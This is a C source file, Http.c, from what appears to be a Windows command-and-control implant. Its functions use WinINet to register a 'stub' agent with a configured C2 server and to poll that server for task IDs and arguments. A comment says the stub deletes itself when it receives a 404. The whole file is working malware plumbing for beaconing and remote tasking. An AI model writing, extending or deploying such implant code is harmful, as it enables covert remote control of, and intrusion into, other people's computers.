//
// Created by j4ck on 3/15/24.
//
#include <windows.h>
#include <wchar.h>
#include <stdio.h>
#include <wininet.h>
#include "../Include/Http.h"
#include "../Include/Agent.h"
#include "../Include/Tasks.h"
#include "../Include/Serializer.h"

#pragma comment (lib, "Wininet.lib")

/*
 * Called when the stub is executed for the first time.
 * If response is 200: Call GetAgentInformation() in Agent.c. If response is 404 delete stub.
*/
BOOL HttpEstablishConnection(IN PBYTE pBuffer) {

    HINTERNET hSession = InternetOpenW(NULL, 0, NULL, NULL, 0);
    if (hSession == NULL) {
        printf("[!] InternetOpenW Failed %ld\n", GetLastError());
        return FALSE;
    }

    HINTERNET hConnect = InternetConnectW(
            hSession,
            Agent->Config.url, // HOST
            Agent->Config.port,
            L"",
            L"",
            INTERNET_SERVICE_HTTP,
            INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_CACHE_WRITE,
            0);
    if (hConnect == NULL) {
        wprintf(L"[!] InternetConnectW Failed %ld\n", GetLastError());
        return FALSE;
    }

    HINTERNET hHttpFile = HttpOpenRequestA(
            hConnect,
            "GET", // METHOD
            (char*)pBuffer,   // URI
            NULL,
            NULL,
            NULL,
            INTERNET_FLAG_RELOAD,
            0);

    if (hHttpFile == NULL) {
        printf("[!] HttpOpenRequestW Failed %ld\n", GetLastError());
        return FALSE;
    }


    LPCSTR header = "Content-Type: x-www-form-url-encoded";

    if (!HttpSendRequestA(hHttpFile, header, strlen(header), NULL, 0)) { // +1 for the null-terminator
        printf("HttpSendRequestA Failed %ld\n", GetLastError());
        return FALSE;
    }

    DWORD dwBytesRead;
    CHAR pResponseRawData[4096];
    DWORD dwTaskId = 0;
    PCHAR pTaskArgs = NULL;

    while(InternetReadFile(hHttpFile, pResponseRawData, 100, &dwBytesRead) && dwBytesRead > 0) {
        pResponseRawData[dwBytesRead] = '\0'; // Add null terminator to string
        JsonParseResponseFromC2(pResponseRawData, &dwTaskId, &pTaskArgs) ;
        if (dwTaskId == 99) {
            Agent->Config.UniqueId = pTaskArgs;
        }
    }

    InternetCloseHandle(hHttpFile);
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);

    printf("[+] Http.c HttpEstablishConnection FINISHED");

    return TRUE;
}



BOOL HttpGetTask(IN PBYTE pBuffer, OUT PDWORD pdwTaskId, OUT PCHAR *pTaskArgs) {
    printf("[+] HttpGetTask");

    HINTERNET hSession = InternetOpenW(NULL, 0, NULL, NULL, 0);
    if (hSession == NULL) {
        printf("[!] InternetOpenW Failed %ld\n", GetLastError());
        return FALSE;
    }

    HINTERNET hConnect = InternetConnectW(
            hSession,
            Agent->Config.url, // HOST
            Agent->Config.port,
            L"",
            L"",
            INTERNET_SERVICE_HTTP,
            INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_CACHE_WRITE,
            0);
    if (hConnect == NULL) {
        wprintf(L"[!] InternetConnectW Failed %ld\n", GetLastError());
        return FALSE;
    }

    HINTERNET hHttpFile = HttpOpenRequestA(
            hConnect,
            "GET", // METHOD
            (char*)pBuffer,   // URI
            NULL,
            NULL,
            NULL,
            INTERNET_FLAG_RELOAD,
            0);

    if (hHttpFile == NULL) {
        printf("[!] HttpOpenRequestW Failed %ld\n", GetLastError());
        return FALSE;
    }


    LPCSTR header = "Content-Type: x-www-form-url-encoded";


    if (!HttpSendRequestA(hHttpFile, header, strlen(header), NULL, 0)) { // +1 for the null-terminator
        printf("HttpSendRequestA Failed %ld\n", GetLastError());
        return FALSE;
    }
    // TODO I FEEL LIKE Cleanup is breaking the flombag


    DWORD bytesRead;
    CHAR responseData[4096];
    while(InternetReadFile(hHttpFile, responseData, 100, &bytesRead) && bytesRead > 0) {
        responseData[bytesRead] = '\0'; // Add null terminator to string
        JsonParseResponseFromC2(responseData, pdwTaskId, pTaskArgs);


    }

    return TRUE;

}